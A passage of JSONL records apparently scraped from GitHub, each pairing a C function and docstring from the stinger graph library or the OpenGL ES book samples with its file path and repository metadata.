HW_REALMEM and HW_PHYSMEM */\n\n#if defined(CTL_HW) && (defined(HW_MEMSIZE) || defined(HW_PHYSMEM64))\n\tint mib[2];\n\tmib[0] = CTL_HW;\n#if defined(HW_MEMSIZE)\n\tmib[1] = HW_MEMSIZE;\t\t/* OSX. --------------------- */\n#elif defined(HW_PHYSMEM64)\n\tmib[1] = HW_PHYSMEM64;\t\t/* NetBSD, OpenBSD. --------- */\n#endif\n\tint64_t size = 0;\t\t/* 64-bit */\n\tsize_t len = sizeof( size );\n\tif ( sysctl( mib, 2, &size, &len, NULL, 0 ) == 0 )\n\t\treturn (size_t)size;\n\treturn 0L;\t\t\t/* Failed? */\n\n#elif defined(_SC_AIX_REALMEM)\n\t/* AIX. ----------------------------------------------------- */\n\treturn (size_t)sysconf( _SC_AIX_REALMEM ) * (size_t)1024L;\n\n#elif defined(_SC_PHYS_PAGES) && defined(_SC_PAGESIZE)\n\t/* FreeBSD, Linux, OpenBSD, and Solaris. -------------------- */\n\treturn (size_t)sysconf( _SC_PHYS_PAGES ) *\n\t\t(size_t)sysconf( _SC_PAGESIZE );\n\n#elif defined(_SC_PHYS_PAGES) && defined(_SC_PAGE_SIZE)\n\t/* Legacy. -------------------------------------------------- */\n\treturn (size_t)sysconf( _SC_PHYS_PAGES ) *\n\t\t(size_t)sysconf( _SC_PAGE_SIZE );\n\n#elif defined(CTL_HW) && (defined(HW_PHYSMEM) || defined(HW_REALMEM))\n\t/* DragonFly BSD, FreeBSD, NetBSD, OpenBSD, and OSX. -------- */\n\tint mib[2];\n\tmib[0] = CTL_HW;\n#if defined(HW_REALMEM)\n\tmib[1] = HW_REALMEM;\t\t/* FreeBSD. ----------------- */\n#elif defined(HW_PYSMEM)\n\tmib[1] = HW_PHYSMEM;\t\t/* Others. ------------------ */\n#endif\n\tunsigned int size = 0;\t\t/* 32-bit */\n\tsize_t len = sizeof( size );\n\tif ( sysctl( mib, 2, &size, &len, NULL, 0 ) == 0 )\n\t\treturn (size_t)size;\n\treturn 0L;\t\t\t/* Failed? */\n#endif /* sysctl and sysconf variants */\n\n#else\n\treturn 0L;\t\t\t/* Unknown OS. */\n#endif\n}", "path": "lib\\compat\\src\\getMemorySize.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/**\n * Generate BSON from BCON\n * @param b a BSON object\n * @param bc a BCON object\n * match with bson_destroy\n */\n", "func_signal": "bcon_error_t bson_from_bcon(bson *b, const bcon *bc)", "code": "{\n    bcon_error_t ret = BSON_OK;\n    bson_init( b );\n    ret = bson_append_bcon_with_state( b, bc, State_Element );\n    if (ret != BCON_OK) return ret;\n    ret = bson_finish( b );\n    return ( ret == BSON_OK ? BCON_OK : BCON_BSON_ERROR );\n}", "path": "lib\\mongo_c_driver\\src\\bcon.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/* OUTDEGREE */\n", "func_signal": "inline vdegree_t\nstinger_vertex_outdegree_get(const stinger_vertices_t * vertices, vindex_t v)", "code": "{\n  if (v >= vertices->max_vertices || v < 0) {\n    return -1;\n  }\n  return VTX(v)->outDegree;\n}", "path": "lib\\stinger_core\\src\\stinger_vertex.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/*\n *  On-demand community detection\n *\n */\n", "func_signal": "int64_t community_on_demand(const stinger_t * S, int64_t ** vertices, int64_t ** partitions)", "code": "{\n  if (*vertices != NULL || *partitions != NULL) {\n    LOG_E(\"Community on demand output arrays should not be allocated before call.  Possible memory leak.\");\n  }\n\n  int64_t * output_vertices = NULL;\n  int64_t * output_partitions = NULL;\n\n  /* Initialize to NULL in case of error */\n  *vertices = output_vertices;\n  *partitions = output_partitions;\n\n  /* Allocate output array */\n  int64_t nv = stinger_max_active_vertex(S) + 1;\n  output_vertices = (int64_t *) xmalloc (nv * sizeof(int64_t));\n  output_partitions = (int64_t *) xmalloc (nv * sizeof(int64_t));\n\n  /* Initialize vertex numbers */\n  int64_t v;\n  for (v = 0; v < nv; v += 1) {\n      output_vertices[v] = v;\n  }\n\n  /* Note wiring of max iterations to 5 */\n  community_detection(S, nv, output_partitions, (int64_t) 5);\n\n  /* Set output arrays */\n  *vertices = output_vertices;\n  *partitions = output_partitions;\n\n  return nv;\n}", "path": "lib\\stinger_alg\\src\\community_on_demand.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "//count_intersections (stinger_t * S, int64_t a, int64_t b)\n", "func_signal": "count_intersections (stinger_t * S, int64_t a, int64_t b, int64_t * neighbors, int64_t d)", "code": "{\n  size_t out = 0;\n\n  STINGER_FORALL_OUT_EDGES_OF_VTX_BEGIN(S, b) {\n\n    if (STINGER_EDGE_DEST != a) {\n      int64_t first = 0;\n      int64_t last = d-1;\n      int64_t middle = (first + last)/2;\n\n      while (first <= last) {\n      \tif (neighbors[middle] < STINGER_EDGE_DEST) {\n      \t  first = middle + 1;\n      \t} else if (neighbors[middle] == STINGER_EDGE_DEST) {\n      \t  out++;\n      \t  break;\n      \t} else {\n      \t  last = middle - 1;\n      \t}\n\n      \tmiddle = (first + last)/2;\n      }\n      //out += stinger_has_typed_successor (S, 0, STINGER_EDGE_DEST, a);\n    }\n\n  } STINGER_FORALL_OUT_EDGES_OF_VTX_END();\n\n\n  return out;\n}", "path": "lib\\stinger_alg\\src\\clustering.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/* EDGES */\n", "func_signal": "inline adjacency_t\nstinger_vertex_edges_get(const stinger_vertices_t * vertices, vindex_t v)", "code": "{\n  if (v >= vertices->max_vertices || v < 0) {\n    return -1;\n  }\n  return readff(&(VTX(v)->edges));\n}", "path": "lib\\stinger_core\\src\\stinger_vertex.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/**\n* @brief A simple bucket sort for an array of tuples\n*\n* This function sorts an array of tuples, first by the leading element, then by\n* the trailing element.  It accomplishes this by bucketing by the first element,\n* then sorting by the second element within the bucket.\n*\n* On the Cray XMT, this sort performed very well up to 32 processors.  Hot-spotting\n* and load imbalance make it infeasible for large processor counts.\n*\n* @param array Input array of tuples to sort\n* @param num Number of tuples to sort\n*/\n", "func_signal": "void\nbucket_sort_pairs (int64_t *array, size_t num)", "code": "{\n  int64_t i;\n  int64_t max, min;\n  int64_t *tmp = xmalloc (2 * num * sizeof(int64_t));\n\n  max = min = array[0];\n\n  \n  for (i = 2; i < num<<1; i+=2)\n    if (max < array[i])\n      max = array[i];\n\n  \n  for (i = 2; i < num<<1; i+=2)\n    if (min > array[i])\n      min = array[i];\n\n  int64_t range = max - min + 1;\n  int64_t offset = 0 - min;\n\n  int64_t *start = xmalloc ( (range+2) * sizeof(int64_t) );\n\n  OMP(\"omp parallel for\")\n  for (i = 0; i < range + 2; i++)\n    start[i] = 0;\n\n  start += 2;\n\n  /* Histogram key values */\n  for (i = 0; i < num<<1; i+=2)\n    start[array[i]+offset] += 2;\n\n  /* Compute start index of each bucket */\n  for (i = 0; i < range; i++)\n    start[i] += start[i-1];\n\n  start --;\n\n  /* Move edges into its bucket's segment */\n  OMP(\"omp parallel for\")\n  \n  for (i = 0; i < num<<1; i+=2) {\n    int64_t index = stinger_int64_fetch_add(start+array[i]+offset, 2);\n    tmp[index] = array[i];\n    tmp[index+1] = array[i+1];\n  } \n\n  /* Copy back from tmp to the original array */\n  OMP(\"omp parallel for\")\n  for (i = 0; i < num<<1; i++) {\n    array[i] = tmp[i];\n  }\n\n  start--;\n\n  OMP(\"omp parallel for\")\n  \n  for (i = 0; i < range; i++) {\n    int64_t degree = start[i+1] - start[i];\n    if (degree >= 4)\n      qsort(&array[start[i]], degree>>1, 2*sizeof(int64_t), i64_pair_cmp);\n  }\n\n  free(start);\n  free(tmp);\n}", "path": "lib\\stinger_utils\\src\\stinger_utils.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/*\n * simplified FSM to parse BCON structure, uses stacks for sub-documents and sub-arrays\n */\n", "func_signal": "static bcon_error_t bson_append_bcon_with_state(bson *b, const bcon *bc, bcon_state_t start_state)", "code": "{\n    bcon_error_t ret = BCON_OK;\n    bcon_state_t state = start_state;\n    char *key = 0;\n    char *typespec = 0;\n    unsigned char doc_stack[DOC_STACK_SIZE];\n    size_t doc_stack_pointer = 0;\n    size_t array_index = 0;\n    size_t array_index_stack[ARRAY_INDEX_STACK_SIZE];\n    size_t array_index_stack_pointer = 0;\n    char array_index_buffer[ARRAY_INDEX_BUFFER_SIZE]; /* max BSON size */\n    int end_of_data;\n    const bcon *bcp;\n    for (end_of_data = 0, bcp = bc; ret == BCON_OK && !end_of_data; bcp++) {\n        bcon bci = *bcp;\n        char *s = bci.s;\n        switch (state) {\n        case State_Element:\n            switch (bcon_token(s)) {\n            case Token_CloseBrace:\n                bson_append_finish_object( b );\n                DOC_POP_STATE; /* state = ...; */\n                break;\n            case Token_End:\n                end_of_data = 1;\n                break;\n            default:\n                key = s;\n                state = State_DocSpecValue;\n                break;\n            }\n            break;\n        case State_DocSpecValue:\n            switch (bcon_token(s)) {\n            case Token_Typespec:\n                typespec = s;\n                state = State_DocValue;\n                break;\n            case Token_OpenBrace:\n                bson_append_start_object( b, key );\n                DOC_PUSH_STATE(State_Element);\n                state = State_Element;\n                break;\n            case Token_OpenBracket:\n                bson_append_start_array( b, key );\n                ARRAY_PUSH_RESET_INDEX_STATE(State_Element);\n                state = State_ArraySpecValue;\n                break;\n            case Token_End:\n                end_of_data = 1;\n                break;\n            default:\n                ret = bson_bcon_key_value(b, key, typespec, bci);\n                state = State_Element;\n                break;\n            }\n            break;\n        case State_DocValue:\n            ret = bson_bcon_key_value(b, key, typespec, bci);\n            state = State_Element;\n            typespec = 0;\n            break;\n        case State_ArraySpecValue:\n            switch (bcon_token(s)) {\n            case Token_Typespec:\n                typespec = s;\n                state = State_ArrayValue;\n                break;\n            case Token_OpenBrace:\n                key = ARRAY_KEY_STRING(array_index++);\n                bson_append_start_object( b, key );\n                DOC_PUSH_STATE(State_ArraySpecValue);\n                state = State_Element;\n                break;\n            case Token_OpenBracket:\n                key = ARRAY_KEY_STRING(array_index++);\n                bson_append_start_array( b, key );\n                ARRAY_PUSH_RESET_INDEX_STATE(State_ArraySpecValue);\n                /* state = State_ArraySpecValue; */\n                break;\n            case Token_CloseBracket:\n                bson_append_finish_array( b );\n                ARRAY_POP_INDEX_STATE; /* state = ...; */\n                break;\n            case Token_End:\n                end_of_data = 1;\n                break;\n            default:\n                key = ARRAY_KEY_STRING(array_index++);\n                ret = bson_bcon_key_value(b, key, typespec, bci);\n                /* state = State_ArraySpecValue; */\n                break;\n            }\n            break;\n        case State_ArrayValue:\n            key = ARRAY_KEY_STRING(array_index++);\n            ret = bson_bcon_key_value(b, key, typespec, bci);\n            state = State_ArraySpecValue;\n            typespec = 0;\n            break;\n        default: assert(NOT_REACHED); break;\n        }\n    }\n    return state == start_state ? BCON_OK : BCON_DOCUMENT_INCOMPLETE;\n}", "path": "lib\\mongo_c_driver\\src\\bcon.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/**\n* @brief For a given vertex and edge type in STINGER, sort the adjacency list\n*\n* This function sorts the linked block data structure inside STINGER for a\n* particular vertex ID and edge type.  Since STINGER is assumed to be changing,\n* we cannot guarantee that the adjacency list will remain sorted.  We provide\n* this function such that some algorithms may see a small speed-up if sorted or\n* partially sorted.\n*\n* This function is currently EXPERIMENTAL.  There are known bugs.  Please report\n* bugs to the development team.\n*\n* @param S The STINGER data structure\n* @param srcvtx Vertex ID of the adjacency list to sort\n* @param type Edge type of the adjacency list to sort\n*/\n", "func_signal": "void\nstinger_sort_edge_list (const struct stinger *S, const int64_t srcvtx,\n                        const int64_t type)", "code": "{\n  MAP_STING(S);\n  struct stinger_eb * ebpool_priv = ebpool->ebpool;\n\n  int64_t sorted = 0;\n  struct stinger_eb *cur_eb;\n  struct stinger_eb *next_eb;\n\n  struct stinger_eb *start = ebpool_priv + stinger_vertex_edges_get(vertices, srcvtx);\n  while (start != ebpool_priv && start->etype != type) {\n    start = ebpool_priv + start->next;\n  }\n\n  while (!sorted) {\n    cur_eb = start;\n\n    sorted = 1;\n    while (cur_eb != ebpool_priv && cur_eb->etype == type) {\n      next_eb = ebpool_priv + cur_eb->next;\n\n      for (uint64_t i = 1; i < STINGER_EDGEBLOCKSIZE; i += 2) {\n        if (i < STINGER_EDGEBLOCKSIZE - 1) {\n          if (stinger_eb_adjvtx(cur_eb,i) > stinger_eb_adjvtx(cur_eb,i+1)) {\n            struct stinger_edge tmp = cur_eb->edges[i + 1];\n            cur_eb->edges[i + 1] = cur_eb->edges[i];\n            cur_eb->edges[i] = tmp;\n            sorted = 0;\n          }\n        } else {\n          if (cur_eb->next && ebpool_priv[cur_eb->next].etype == type\n              && stinger_eb_adjvtx(cur_eb,i) > stinger_eb_adjvtx(next_eb,0)) {\n            struct stinger_edge tmp = ebpool_priv[cur_eb->next].edges[0];\n            ebpool_priv[cur_eb->next].edges[0] = cur_eb->edges[i];\n            cur_eb->edges[i] = tmp;\n            sorted = 0;\n          }\n        }\n      }\n      cur_eb = ebpool_priv + cur_eb->next;\n    }\n\n    cur_eb = start;\n\n    while (cur_eb != ebpool_priv && cur_eb->etype == type) {\n      next_eb = ebpool_priv + cur_eb->next;\n\n      for (uint64_t i = 0; i < STINGER_EDGEBLOCKSIZE; i += 2) {\n        if (i < STINGER_EDGEBLOCKSIZE - 1) {\n          if (stinger_eb_adjvtx(cur_eb,i) > stinger_eb_adjvtx(cur_eb,i+1)) {\n            struct stinger_edge tmp = cur_eb->edges[i + 1];\n            cur_eb->edges[i + 1] = cur_eb->edges[i];\n            cur_eb->edges[i] = tmp;\n            sorted = 0;\n          }\n        } else {\n          if (cur_eb->next && ebpool_priv[cur_eb->next].etype == type\n              && stinger_eb_adjvtx(cur_eb,i) > stinger_eb_adjvtx(next_eb,0)) {\n            struct stinger_edge tmp = ebpool_priv[cur_eb->next].edges[0];\n            ebpool_priv[cur_eb->next].edges[0] = cur_eb->edges[i];\n            cur_eb->edges[i] = tmp;\n            sorted = 0;\n          }\n        }\n      }\n      cur_eb = ebpool_priv + cur_eb->next;\n    }\n  }\n\n  cur_eb = start;\n  while (cur_eb != ebpool_priv && cur_eb->etype == type) {\n    int64_t curLargeTS = INT64_MIN;\n    int64_t curSmallTS = INT64_MAX;\n    int64_t curNumEdges = 0;\n    int64_t curHigh = 0;\n\n    for (uint64_t i = 0; i < STINGER_EDGEBLOCKSIZE; i++) {\n      if (!stinger_eb_is_blank (cur_eb, i)) {\n        if (stinger_eb_adjvtx(cur_eb,i) == 0\n            && stinger_eb_weight(cur_eb,i) == 0\n            && stinger_eb_first_ts(cur_eb,i) == 0\n            && stinger_eb_ts(cur_eb,i) == 0) {\n          cur_eb->edges[i].neighbor = -1;\n        } else {\n          curNumEdges++;\n          if (i > curHigh)\n            curHigh = i;\n          if (cur_eb->edges[i].timeFirst < curSmallTS)\n            curSmallTS = stinger_eb_first_ts(cur_eb,i);\n          if (cur_eb->edges[i].timeRecent > curLargeTS)\n            curLargeTS = stinger_eb_ts(cur_eb,i);\n        }\n      }\n    }\n\n    cur_eb->high = curHigh + 1;\n    cur_eb->numEdges = curNumEdges;\n    cur_eb->largeStamp = curLargeTS;\n    cur_eb->smallStamp = curSmallTS;\n    cur_eb = ebpool_priv + cur_eb->next;\n  }\n}", "path": "lib\\stinger_utils\\src\\stinger_utils.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/**\n* @brief Take a plain edge list and convert it into a STINGER. If only \n* recent timestamps or modified timestamps are given, they will be used \n* for both.  If neither are given, the default is used.\n*\n* @param nv Number of vertices\n* @param ne Number of edges\n* @param sv Array of source vertices\n* @param ev Array of destination vertices\n* @param w Array of edge weights\n* @param timeRecent Array of timestamps or NULL\n* @param timeFirst Array of timestamps or NULL\n* @param timestamp Default timestamp (if recent and modified not given)\n* \n* @return A STINGER data structure\n*/\n", "func_signal": "struct stinger *\nedge_list_to_stinger (int64_t nv, int64_t ne,\n                      int64_t * sv, int64_t * ev, int64_t * w, \n\t\t      int64_t * timeRecent, int64_t * timeFirst, \n\t\t      int64_t timestamp)", "code": "{\n  /* if only one is given, use for both */\n  if(timeRecent == NULL) {\n    timeRecent = timeFirst;\n  } else if (timeFirst == NULL) {\n    timeFirst = timeRecent;\n  }\n\n  struct stinger *S = stinger_new ();\n\n  OMP(\"omp parallel for\")\n  for (int64_t i = 0; i < ne; i++) {\n    stinger_insert_edge (S, 0, sv[i], ev[i], w[i], (timeFirst)?timeFirst:timestamp);\n    if (timeRecent && timeRecent != timeFirst) {\n      stinger_edge_touch (S, sv[i], ev[i], 0, timeRecent);\n    }\n  }\n\n  return S;\n}", "path": "lib\\stinger_utils\\src\\stinger_utils.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/* TYPE */\n", "func_signal": "inline vtype_t\nstinger_vertex_type_get(const stinger_vertices_t * vertices, vindex_t v)", "code": "{\n  if (v >= vertices->max_vertices || v < 0) {\n    return -1;\n  }\n  return VTX(v)->type;\n}", "path": "lib\\stinger_core\\src\\stinger_vertex.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/**\n* @brief Prints basic statistics about the graph loaded from disk\n*\n* @param nv Number of vertices\n* @param ne Number of edges\n* @param batch_size Batch size of the action stream (specified on the command line)\n* @param nbatch Number of batches (specified on the command line)\n* @param naction Number of edge actions in the action stream\n*/\n", "func_signal": "void\nprint_initial_graph_stats (int64_t nv, int64_t ne, int64_t batch_size,\n                           int64_t nbatch, int64_t naction)", "code": "{\n  printf (\",\\n\\t\\\"nv\\\": %ld\", (long int) nv);\n  printf (\",\\n\\t\\\"ne\\\": %ld\", (long int) ne);\n  printf (\",\\n\\t\\\"batchsize\\\": %ld\", (long int) batch_size);\n  printf (\",\\n\\t\\\"nbatch\\\": %ld\", (long int) nbatch);\n  printf (\",\\n\\t\\\"naction\\\": %ld\", (long int) naction);\n}", "path": "lib\\stinger_utils\\src\\stinger_utils.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/* DEGREE */\n", "func_signal": "inline vdegree_t\nstinger_vertex_degree_get(const stinger_vertices_t * vertices, vindex_t v)", "code": "{\n  if (v >= vertices->max_vertices || v < 0) {\n    return -1;\n  }\n  return VTX(v)->degree;\n}", "path": "lib\\stinger_core\\src\\stinger_vertex.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "///\n// Create a simple 2x2 texture image with four different colors\n//\n", "func_signal": "GLuint CreateSimpleTexture2D( )", "code": "{\n   // Texture object handle\n   GLuint textureId;\n   \n   // 2x2 Image, 3 bytes per pixel (R, G, B)\n   GLubyte pixels[4 * 3] =\n   {  \n      255,   0,   0, // Red\n        0, 255,   0, // Green\n        0,   0, 255, // Blue\n      255, 255,   0  // Yellow\n   };\n\n   // Use tightly packed data\n   glPixelStorei ( GL_UNPACK_ALIGNMENT, 1 );\n\n   // Generate a texture object\n   glGenTextures ( 1, &textureId );\n\n   // Bind the texture object\n   glBindTexture ( GL_TEXTURE_2D, textureId );\n\n   // Load the texture\n   glTexImage2D ( GL_TEXTURE_2D, 0, GL_RGB, 2, 2, 0, GL_RGB, GL_UNSIGNED_BYTE, pixels );\n\n   // Set the filtering mode\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST );\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST );\n\n   return textureId;\n\n}", "path": "Raspi\\Chapter_9\\Simple_Texture2D\\Simple_Texture2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Update MVP matrix based on time\n//\n", "func_signal": "void Update ( ESContext *esContext, float deltaTime )", "code": "{\n   UserData *userData = (UserData*) esContext->userData;\n   ESMatrix perspective;\n   ESMatrix modelview;\n   float    aspect;\n   \n   // Compute a rotation angle based on time to rotate the cube\n   userData->angle += ( deltaTime * 40.0f );\n   if( userData->angle >= 360.0f )\n      userData->angle -= 360.0f;\n\n   // Compute the window aspect ratio\n   aspect = (GLfloat) esContext->width / (GLfloat) esContext->height;\n   \n   // Generate a perspective matrix with a 60 degree FOV\n   esMatrixLoadIdentity( &perspective );\n   esPerspective( &perspective, 60.0f, aspect, 1.0f, 20.0f );\n\n   // Generate a model view matrix to rotate/translate the cube\n   esMatrixLoadIdentity( &modelview );\n\n   // Translate away from the viewer\n   esTranslate( &modelview, 0.0, 0.0, -2.0 );\n\n   // Rotate the cube\n   esRotate( &modelview, userData->angle, 1.0, 0.0, 1.0 );\n   \n   // Compute the final MVP by multiplying the \n   // modevleiw and perspective matrices together\n   esMatrixMultiply( &userData->mvpMatrix, &modelview, &perspective );\n}", "path": "LinuxX11\\Chapter_8\\Simple_VertexShader\\Simple_VertexShader.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Draw a triangle using the shader pair created in Init()\n//\n", "func_signal": "void Draw ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n   GLfloat vVertices[] = { -0.5f,  0.5f, 0.0f,  // Position 0\n                            0.0f,  0.0f,        // TexCoord 0 \n                           -0.5f, -0.5f, 0.0f,  // Position 1\n                            0.0f,  1.0f,        // TexCoord 1\n                            0.5f, -0.5f, 0.0f,  // Position 2\n                            1.0f,  1.0f,        // TexCoord 2\n                            0.5f,  0.5f, 0.0f,  // Position 3\n                            1.0f,  0.0f         // TexCoord 3\n                         };\n   GLushort indices[] = { 0, 1, 2, 0, 2, 3 };\n      \n   // Set the viewport\n   glViewport ( 0, 0, esContext->width, esContext->height );\n   \n   // Clear the color buffer\n   glClear ( GL_COLOR_BUFFER_BIT );\n\n   // Use the program object\n   glUseProgram ( userData->programObject );\n\n   // Load the vertex position\n   glVertexAttribPointer ( userData->positionLoc, 3, GL_FLOAT, \n                           GL_FALSE, 5 * sizeof(GLfloat), vVertices );\n   // Load the texture coordinate\n   glVertexAttribPointer ( userData->texCoordLoc, 2, GL_FLOAT,\n                           GL_FALSE, 5 * sizeof(GLfloat), &vVertices[3] );\n\n   glEnableVertexAttribArray ( userData->positionLoc );\n   glEnableVertexAttribArray ( userData->texCoordLoc );\n\n   // Bind the texture\n   glActiveTexture ( GL_TEXTURE0 );\n   glBindTexture ( GL_TEXTURE_2D, userData->textureId );\n\n   // Set the sampler texture unit to 0\n   glUniform1i ( userData->samplerLoc, 0 );\n\n   glDrawElements ( GL_TRIANGLES, 6, GL_UNSIGNED_SHORT, indices );\n\n}", "path": "Raspi\\Chapter_9\\Simple_Texture2D\\Simple_Texture2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Draw a triangle using the shader pair created in Init()\n//\n", "func_signal": "void Draw ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n   \n   // Set the viewport\n   glViewport ( 0, 0, esContext->width, esContext->height );\n   \n   \n   // Clear the color buffer\n   glClear ( GL_COLOR_BUFFER_BIT );\n\n   // Use the program object\n   glUseProgram ( userData->programObject );\n\n   // Load the vertex position\n   glVertexAttribPointer ( userData->positionLoc, 3, GL_FLOAT, \n                           GL_FALSE, 3 * sizeof(GLfloat), userData->vertices );\n   \n   glEnableVertexAttribArray ( userData->positionLoc );\n   \n   \n   // Load the MVP matrix\n   glUniformMatrix4fv( userData->mvpLoc, 1, GL_FALSE, (GLfloat*) &userData->mvpMatrix.m[0][0] );\n   \n   // Draw the cube\n   glDrawElements ( GL_TRIANGLES, userData->numIndices, GL_UNSIGNED_INT, userData->indices );\n}", "path": "LinuxX11\\Chapter_8\\Simple_VertexShader\\Simple_VertexShader.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Cleanup\n//\n", "func_signal": "void ShutDown ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n\n   // Delete texture object\n   glDeleteTextures ( 1, &userData->textureId );\n\n   // Delete program object\n   glDeleteProgram ( userData->programObject );\n}", "path": "Windows\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Initialize the shader and program object\n//\n", "func_signal": "int Init ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n   GLbyte vShaderStr[] =\n      \"uniform float u_offset;      \\n\"\n      \"attribute vec4 a_position;   \\n\"\n      \"attribute vec2 a_texCoord;   \\n\"\n      \"varying vec2 v_texCoord;     \\n\"\n      \"void main()                  \\n\"\n      \"{                            \\n\"\n      \"   gl_Position = a_position; \\n\"\n      \"   gl_Position.x += u_offset;\\n\"\n      \"   v_texCoord = a_texCoord;  \\n\"\n      \"}                            \\n\";\n   \n   GLbyte fShaderStr[] =  \n      \"precision mediump float;                            \\n\"\n      \"varying vec2 v_texCoord;                            \\n\"\n      \"uniform sampler2D s_texture;                        \\n\"\n      \"void main()                                         \\n\"\n      \"{                                                   \\n\"\n      \"  gl_FragColor = texture2D( s_texture, v_texCoord );\\n\"\n      \"}                                                   \\n\";\n\n   // Load the shaders and get a linked program object\n   userData->programObject = esLoadProgram ( vShaderStr, fShaderStr );\n\n   // Get the attribute locations\n   userData->positionLoc = glGetAttribLocation ( userData->programObject, \"a_position\" );\n   userData->texCoordLoc = glGetAttribLocation ( userData->programObject, \"a_texCoord\" );\n   \n   // Get the sampler location\n   userData->samplerLoc = glGetUniformLocation ( userData->programObject, \"s_texture\" );\n\n   // Get the offset location\n   userData->offsetLoc = glGetUniformLocation( userData->programObject, \"u_offset\" );\n\n   // Load the texture\n   userData->textureId = CreateMipMappedTexture2D ();\n\n   glClearColor ( 0.0f, 0.0f, 0.0f, 0.0f );\n   return TRUE;\n}", "path": "Windows\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Initialize the shader and program object\n//\n", "func_signal": "int Init ( ESContext *esContext )", "code": "{\n   esContext->userData = malloc(sizeof(UserData));\n\t\n   UserData *userData = esContext->userData;\n   GLbyte vShaderStr[] =\n      \"uniform float u_offset;      \\n\"\n      \"attribute vec4 a_position;   \\n\"\n      \"attribute vec2 a_texCoord;   \\n\"\n      \"varying vec2 v_texCoord;     \\n\"\n      \"void main()                  \\n\"\n      \"{                            \\n\"\n      \"   gl_Position = a_position; \\n\"\n      \"   gl_Position.x += u_offset;\\n\"\n      \"   v_texCoord = a_texCoord;  \\n\"\n      \"}                            \\n\";\n   \n   GLbyte fShaderStr[] =  \n      \"precision mediump float;                            \\n\"\n      \"varying vec2 v_texCoord;                            \\n\"\n      \"uniform sampler2D s_texture;                        \\n\"\n      \"void main()                                         \\n\"\n      \"{                                                   \\n\"\n      \"  gl_FragColor = texture2D( s_texture, v_texCoord );\\n\"\n      \"}                                                   \\n\";\n\n   // Load the shaders and get a linked program object\n   userData->programObject = esLoadProgram ( vShaderStr, fShaderStr );\n\n   // Get the attribute locations\n   userData->positionLoc = glGetAttribLocation ( userData->programObject, \"a_position\" );\n   userData->texCoordLoc = glGetAttribLocation ( userData->programObject, \"a_texCoord\" );\n   \n   // Get the sampler location\n   userData->samplerLoc = glGetUniformLocation ( userData->programObject, \"s_texture\" );\n\n   // Get the offset location\n   userData->offsetLoc = glGetUniformLocation( userData->programObject, \"u_offset\" );\n\n   // Load the texture\n   userData->textureId = CreateMipMappedTexture2D ();\n\n   glClearColor ( 0.0f, 0.0f, 0.0f, 1.0f );\n   return GL_TRUE;\n}", "path": "Raspi\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Initialize the shader and program object\n//\n", "func_signal": "int Init ( ESContext *esContext )", "code": "{\n   esContext->userData = malloc(sizeof(UserData));\n\t\n   UserData *userData = esContext->userData;\n   GLbyte vShaderStr[] =  \n      \"uniform mat4 u_mvpMatrix;                   \\n\"\n      \"attribute vec4 a_position;                  \\n\"\n      \"void main()                                 \\n\"\n      \"{                                           \\n\"\n      \"   gl_Position = u_mvpMatrix * a_position;  \\n\"\n      \"}                                           \\n\";\n   \n   GLbyte fShaderStr[] =  \n      \"precision mediump float;                            \\n\"\n      \"void main()                                         \\n\"\n      \"{                                                   \\n\"\n      \"  gl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );        \\n\"\n      \"}                                                   \\n\";\n\n   // Load the shaders and get a linked program object\n   userData->programObject = esLoadProgram ( vShaderStr, fShaderStr );\n\n   // Get the attribute locations\n   userData->positionLoc = glGetAttribLocation ( userData->programObject, \"a_position\" );\n\n   // Get the uniform locations\n   userData->mvpLoc = glGetUniformLocation( userData->programObject, \"u_mvpMatrix\" );\n   \n   // Generate the vertex data\n   userData->numIndices = esGenCube( 1.0, &userData->vertices,\n                                     NULL, NULL, &userData->indices );\n   \n   // Starting rotation angle for the cube\n   userData->angle = 45.0f;\n\n   glClearColor ( 0.0f, 0.0f, 0.0f, 0.0f );\n   return GL_TRUE;\n}", "path": 